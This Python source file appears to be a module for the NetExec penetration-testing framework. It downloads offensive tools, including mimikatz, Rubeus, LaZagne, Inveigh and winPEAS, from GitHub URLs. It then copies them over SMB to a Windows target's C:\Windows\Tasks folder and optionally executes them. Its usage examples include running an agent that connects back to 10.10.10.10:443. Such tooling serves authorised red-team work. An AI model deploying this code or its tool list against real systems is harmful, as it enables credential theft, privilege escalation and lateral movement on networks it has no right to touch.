#!/usr/bin/env python3
# -*- coding: utf-8 -*-  # noqa: UP009

import os
import requests
import hashlib
from sys import exit

class NXCModule:
    name = "toolexec"
    description = "Transfers and executes utilities for usage in a new environment."
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
        Download tools to local directory and transfer them to the target system. Tools are downloaded locally and then transferred to the target system. Custom tools can be specified as URLs or local file paths.

        Options:
        MODE            Deployment mode (custom, all, enum, exploit; default: all)
        DIR             Remote directory for tool transfer (default: C:\\Windows\\Tasks\\)
        OVERWRITE       Overwrite existing files on target (True/False; default: False)
        CUSTOM          Custom tools (file path, directory, or comma-separated URLs)
        EXEC            Execute the transferred files (True/False; default: False)
        ARGS            Arguments to pass to the executed files (string; optional)
        FORCE           Force re-download even if the file exists locally (True/False; default: False)
        LOCAL_DIR       Local directory to store downloaded tools (default: /home/$USER/.nxc/logs/Tools)

        Examples
        --------
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=enum
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=enum DIR=C:\\Windows\\Temp\\
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/tools/
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/agent.exe
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=https://example.com/tool.exe EXEC=True ARGS='--help'
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=all OVERWRITE=True
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=exploit FORCE=True
        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443'
        """
        self.MODE = module_options.get("MODE", "all").lower()
        self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\").replace("/", "\\")
        self.overwrite = module_options.get("OVERWRITE", "False").lower() == "true"
        self.EXEC = module_options.get("EXEC", "False").lower() == "true"
        self.ARGS = module_options.get("ARGS", "")
        self.FORCE = module_options.get("FORCE", "False").lower() == "true"  # Force re-download even if file exists locally
        self.LOCAL_DIR = module_options.get("LOCAL_DIR", f"/home/{os.getenv('USER')}/.nxc/logs/Tools")  # Default local directory
        custom_tools = module_options.get("CUSTOM", "")
        self.custom_tools = custom_tools.split(",") if custom_tools else []

        # Create the local directory if it doesn't exist
        os.makedirs(self.LOCAL_DIR, exist_ok=True)

        # Error handling for custom mode
        if self.MODE == "custom":
            if not self.custom_tools:
                context.log.fail("CUSTOM option is required when MODE is set to 'custom'.")
                exit(1)
            for tool in self.custom_tools:
                if tool.startswith(("http://", "https://")):
                    continue  # URLs are valid
                if not os.path.exists(tool):
                    context.log.fail(f"Invalid path or URL provided in CUSTOM: {tool}")
                    exit(1)

    def on_admin_login(self, context, connection):
        """Execute the selected technique upon admin login."""
        if not self.location.endswith("\\"):
            self.location += "\\"

        # Check if the target directory exists
        check_dir_command = f'cmd.exe /c "if exist {self.location} (echo exists) else (echo not found)"'
        output = connection.execute(check_dir_command, True)
        if "not found" in output:
            context.log.fail(f"Target directory does not exist: {self.location}")
            exit(1)

        if self.MODE == "custom":
            self.deploy_custom_tools(context, connection)
        elif self.MODE == "all":
            self.install_all(context, connection)
        elif self.MODE == "enum":
            self.deploy_tools(context, connection, "enum")
        elif self.MODE == "exploit":
            self.deploy_tools(context, connection, "exploit")
        else:
            context.log.fail(f"Invalid MODE: {self.MODE}")

        if self.EXEC:
            self.execute_transferred_files(context, connection)

    def handle_local_mode(self, context, connection):
        """Handles downloading tools locally and transferring them to the target."""
        context.log.highlight("Downloading tools locally and transferring to target...")
        tools = self.get_tools_based_on_mode()

        for tool in tools:
            filename = tool["url"].split("/")[-1]
            local_path = os.path.join(self.LOCAL_DIR, filename)

            # If the file exists locally and FORCE is False, skip download
            if os.path.exists(local_path) and not self.FORCE:
                context.log.highlight(f"{filename} already exists locally, skipping download.")
            else:
                # Download the file and verify its MD5 checksum (if not in custom mode)
                if not self.download_and_verify_tool(context, tool, local_path) and not self.FORCE:
                    continue  # Skip if the checksum doesn't match and FORCE is False

            # Transfer the file to the target system
            self.transfer_tool_to_target(context, connection, local_path)

    def download_and_verify_tool(self, context, tool, local_path):
        """Download a tool and verify its MD5 checksum if not in custom mode."""
        filename = os.path.basename(local_path)
        expected_md5 = tool["md5"]

        context.log.highlight(f"Downloading {tool['url']}...")
        try:
            response = requests.get(tool["url"])
            with open(local_path, "wb") as f:
                f.write(response.content)
            context.log.highlight(f"Saved {filename} to {local_path}.")

            # Skip MD5 verification if the mode is custom
            if self.MODE != "custom" and expected_md5:
                if self.calculate_md5(local_path) == expected_md5:
                    context.log.debug(f"MD5 checksum verified for {filename}.")
                    return True
                else:
                    context.log.fail(f"MD5 checksum mismatch for {filename}. File may be corrupted or tampered with.")
                    if not self.FORCE:
                        os.remove(local_path)  # Remove the corrupted file if FORCE is False
                    return False
            else:
                context.log.debug(f"Skipping MD5 checksum verification for {filename} in custom mode.")
                return True
        except Exception as e:
            context.log.fail(f"Failed to download {filename}: {e}")
            return False

    def calculate_md5(self, file_path):
        """Calculate the MD5 checksum of a file."""
        hash_md5 = hashlib.md5()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()

    def transfer_tool_to_target(self, context, connection, local_path):
        """Transfer a tool to the target system."""
        filename = os.path.basename(local_path)
        remote_path = f"{self.location}{filename}"

        if self.check_file_exists_on_target(connection, remote_path) and not self.overwrite:
            context.log.highlight(f"{filename} already exists on the target, skipping upload.")
            return

        context.log.highlight(f"Transferring {local_path} to {remote_path}...")
        try:
            with open(local_path, "rb") as file_stream:
                connection.conn.putFile("C$", remote_path.replace("C:\\", ""), file_stream.read)
            context.log.highlight(f"Successfully uploaded {filename} to {remote_path} on the target.")
        except Exception as e:
            context.log.fail(f"Failed to upload {filename}: {e}")

    def check_file_exists_on_target(self, connection, remote_path):
        """Check if a file exists on the target system."""
        check_command = f'cmd.exe /c "if exist {remote_path} (echo exists) else (echo not found)"'
        output = connection.execute(check_command, True)
        return "exists" in output

    def execute_command_on_target(self, context, connection, command):
        """Execute a command on the target system."""
        context.log.highlight(f"Executing {command}...")
        try:
            output = connection.execute(command, True)
            context.log.highlight(output)
        except Exception as e:
            context.log.fail(f"Failed to execute command: {e}")

    def get_tools_based_on_mode(self, mode=None):
        """Returns the list of tools based on the selected mode."""
        mode = mode or self.MODE
        tools = {
            "enum": [
                {"url": "https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1", "md5": "bae8d67d3be8a9eaf7c764ca7e922b19"},
                {"url": "https://github.com/peass-ng/PEASS-ng/releases/download/20241201-e3889b61/winPEASx64.exe", "md5": "b3804d24677fc788328e8df25a7470b1"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/CertificateAbuse/Certify.exe", "md5": "ae8a48081082b8fe467bf218fa9964e6"},
                {"url": "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe", "md5": "5075f994390f9738e8e69f4de09debe6"}
            ],
            "exploit": [
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Rubeus.exe", "md5": "ef92a49906051502f0208d58cb53a5ed"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Whisker.exe", "md5": "69de9a014c22108256f0854d1f76627e"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/PowerUp.ps1", "md5": "87a2c56f0021f8592774c25158cfedfe"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Inveigh.ps1", "md5": "76ba579f756fa0900dd0d031f87eb13d"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Powermad.ps1", "md5": "9391e3a9f3e2d3288eeeb3561098fb30"},
                {"url": "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Credentials/mimikatz.exe", "md5": "e930b05efe23891d19bc354a4209be3e"}
            ],
            "all": [],
            "custom": self.custom_tools
        }
        if mode == "all":
            tools["all"] = tools["enum"] + tools["exploit"]
        return tools.get(mode, ValueError(f"Invalid mode: {mode}"))

    def install_all(self, context, connection):
        """Install all tools."""
        context.log.highlight("Installing all tools...")
        self.deploy_tools(context, connection, "enum")
        self.deploy_tools(context, connection, "exploit")
        if self.custom_tools:
            self.deploy_custom_tools(context, connection)

    def deploy_tools(self, context, connection, mode):
        """Deploy tools based on the mode."""
        context.log.highlight(f"Deploying {mode} tools...")
        tools = self.get_tools_based_on_mode(mode)
        for tool in tools:
            self.download_and_transfer_tool(context, connection, tool)

    def deploy_custom_tools(self, context, connection):
        """Deploy custom tools."""
        context.log.highlight("Deploying custom tools...")
        for tool in self.custom_tools:
            if tool.startswith(("http://", "https://")):
                # Pass an empty MD5 value for custom tools
                self.download_and_transfer_tool(context, connection, {"url": tool, "md5": ""})
            elif os.path.isfile(tool):
                self.transfer_tool_to_target(context, connection, tool)
            else:
                context.log.fail(f"Invalid path or URL provided in CUSTOM: {tool}")
                exit(1)

    def download_and_transfer_tool(self, context, connection, tool):
        """Download and transfer a tool to the target system."""
        if isinstance(tool, dict):  # URL-based tool
            local_path = os.path.join(self.LOCAL_DIR, tool["url"].split("/")[-1])

            # If the file exists locally and FORCE is False, skip download
            if os.path.exists(local_path) and not self.FORCE:
                context.log.highlight(f"{tool['url'].split('/')[-1]} already exists locally, skipping download.")
            else:
                if not self.download_and_verify_tool(context, tool, local_path) and not self.FORCE:
                    return  # Skip if the checksum doesn't match and FORCE is False

            # Transfer the file to the target system
            self.transfer_tool_to_target(context, connection, local_path)
        else:  # Local file
            self.transfer_tool_to_target(context, connection, tool)

    def execute_transferred_files(self, context, connection):
        """Execute the transferred files with the provided arguments."""
        context.log.highlight("Executing transferred files...")
        if self.MODE == "custom":
            # For custom mode, tools are URLs or paths
            for tool in self.custom_tools:
                filename = tool.split("/")[-1] if tool.startswith(("http://", "https://")) else os.path.basename(tool)
                remote_path = f"{self.location}{filename}"
                if self.check_file_exists_on_target(connection, remote_path):
                    exec_command = f'"{remote_path}" {self.ARGS}'
                    context.log.highlight(f"Executing {remote_path} with arguments: {self.ARGS}")
                    self.execute_command_on_target(context, connection, exec_command)
                else:
                    context.log.highlight(f"{filename} does not exist on target, skipping execution.")
        else:
            # For other modes, tools are dictionaries
            tools = self.get_tools_based_on_mode()
            for tool in tools:
                filename = tool["url"].split("/")[-1]
                remote_path = f"{self.location}{filename}"
                if self.check_file_exists_on_target(connection, remote_path):
                    exec_command = f'"{remote_path}" {self.ARGS}'
                    context.log.highlight(f"Executing {remote_path} with arguments: {self.ARGS}")
                    self.execute_command_on_target(context, connection, exec_command)
                else:
                    context.log.highlight(f"{filename} does not exist on target, skipping execution.")